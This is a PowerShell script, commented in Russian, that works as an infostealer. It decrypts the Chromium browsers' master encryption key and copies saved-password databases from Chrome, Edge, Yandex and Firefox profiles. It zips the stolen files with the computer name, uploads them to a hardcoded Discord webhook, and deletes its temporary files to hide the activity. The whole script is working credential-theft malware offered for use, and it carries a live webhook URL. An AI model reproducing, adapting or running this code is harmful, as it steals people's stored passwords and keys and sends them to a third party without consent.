# [ Конфигурация ]
$hookUrl = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"
$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

Add-Type -AssemblyName System.Security

# Функция дешифровки
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($rawKey[5..($rawKey.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            "[$($label)] Key: $([Convert]::ToBase64String($masterKey))" | Out-File -FilePath $logPath -Append -Encoding UTF8
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userData = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userData) {
        $files = Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $label = "$($b.name)_$($f.Directory.Name)"
            $state = Join-Path $userData "Local State"
            if (Get-Key $state $label) {
                Copy-Item $f.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. FIREFOX (Исправленный блок без переменных $_)
$ffRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffRoot) {
    $profiles = Get-ChildItem -Path $ffRoot -Directory
    foreach ($profile in $profiles) {
        $label = "FF_$($profile.Name)"
        $targets = @("logins.json", "key4.db", "cert9.db")
        foreach ($target in $targets) {
            $fullPath = Join-Path $profile.FullName $target
            if (Test-Path $fullPath) {
                Copy-Item $fullPath -Destination "$tempDir\$($label)_$target" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 3. УПАКОВКА И ОТПРАВКА
if ((Get-ChildItem $tempDir).Count -gt 0) {
    $zipPath = "$env:TEMP\rep_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    try {
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $fileStream = [System.IO.File]::OpenRead($zipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $content.Add($fileContent, "file", "report.zip")
        $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME")), "content")
        
        $response = $client.PostAsync($hookUrl, $content).Result
        
        $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
    } catch {}

    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
